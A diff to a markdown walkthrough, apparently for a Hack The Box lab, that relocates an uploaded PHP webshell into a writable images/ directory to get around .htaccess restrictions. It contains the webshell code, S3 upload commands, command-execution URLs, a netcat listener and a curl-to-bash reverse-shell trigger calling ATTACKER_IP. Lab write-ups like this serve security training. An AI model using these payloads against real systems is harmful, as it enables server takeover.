@@ -255,19 +255,28 @@ nano shell.php
 
 ### Step 2: Upload to S3 Bucket
 
+Since the `images/` directory is writable and served by the web server, we upload the PHP shell there:
+
 ```bash
-aws --endpoint-url=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+aws --endpoint-url=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/images/
 ```
 
 **Output:**
 ```
-upload: ./shell.php to s3://thetoppers.htb/shell.php
+upload: ./shell.php to s3://thetoppers.htb/images/shell.php
 ```
+
+**Why upload to images/ directory?**
+- Root directory has restrictions (`.htaccess` disables PHP execution)
+- `images/` directory is writable and allows PHP execution
+- Files in `images/` are directly accessible via HTTP
+- Better chance of bypassing upload restrictions
 
 ### Step 3: Test PHP RCE
 
+Access the shell in the images directory:
 ```
-http://thetoppers.htb/shell.php?cmd=id
+http://thetoppers.htb/images/shell.php?cmd=id
 ```
 
 **Expected Output:**
@@ -368,12 +377,12 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
 
 In browser, execute:
 ```
-http://thetoppers.htb/shell.php?cmd=curl%20ATTACKER_IP:8000/shell.sh%20|%20bash
+http://thetoppers.htb/images/shell.php?cmd=curl%20ATTACKER_IP:8000/shell.sh%20|%20bash
 ```
 
 **What Happens:**
 ```
-1. PHP executes curl command
+1. PHP in images/ directory executes curl command
 2. curl downloads shell.sh from our HTTP server
 3. Pipe (|) feeds to bash
 4. bash executes shell script
@@ -485,10 +494,13 @@ aws --endpoint-url=http://s3.thetoppers.htb s3 cp s3://thetoppers.htb/shell.php 
 nano shell.php
 # Content: <?php system($_GET["cmd"]); ?>
 
+# Upload to images/ directory (writable, allows PHP execution)
+aws --endpoint-url=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/images/
+
 # Test webshell (URL in browser)
-http://thetoppers.htb/shell.php?cmd=id
-http://thetoppers.htb/shell.php?cmd=whoami
-http://thetoppers.htb/shell.php?cmd=ls%20-la
+http://thetoppers.htb/images/shell.php?cmd=id
+http://thetoppers.htb/images/shell.php?cmd=whoami
+http://thetoppers.htb/images/shell.php?cmd=ls%20-la
 ```
 
 ### Reverse Shell Setup
@@ -508,7 +520,7 @@ nc -nvlp 1337
 python3 -m http.server 8000
 
 # Trigger reverse shell (in browser or curl)
-http://thetoppers.htb/shell.php?cmd=curl%20ATTACKER_IP:8000/shell.sh%20|%20bash
+http://thetoppers.htb/images/shell.php?cmd=curl%20ATTACKER_IP:8000/shell.sh%20|%20bash
 ```
 
 ### Post-Exploitation
